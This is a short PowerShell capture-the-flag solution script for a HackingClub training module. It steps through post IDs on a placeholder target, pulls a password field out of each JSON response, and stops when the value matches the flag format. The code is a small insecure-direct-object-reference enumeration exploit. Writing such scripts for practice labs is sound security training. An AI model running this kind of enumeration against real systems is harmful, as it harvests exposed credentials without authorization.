#===============================================================================================#
# https://app.hackingclub.com/training/modules/30                                               #
#===============================================================================================#
# Descrição: Script básico em powershell para acessar os posts buscando a senha(FLAG) exposta.  #
# Desenvolvido por: Ivan Barbosa Kovalinkinas                                                   #
# Versão: 1.0.0 Beta                                                                            #
# Data: 18/08/2024                                                                              #
#===============================================================================================#
# Site alvo do estudo
$site = 'http://<SITE ALVO>/posts/'
$post = 0
while($true){
    $uri = $site + $post
    try{
        $senha  = ((Invoke-WebRequest -Method:Get -Uri $uri | Select-Object Content) -split ',')[10]
    }
    catch{
        Out-Null
        $post += 1
        continue
    }
    $senha = $((($senha -split ':')[1]) -replace '"','' )
    if( $senha -match "^hackingclub\{.*\}$" ){
        Write-Output "Aqui esta sua FLAG: $senha"
        Set-Clipboard -Value $senha
        Write-Output "FLAG COPIADA!"
        break
    }
    $post += 1
}
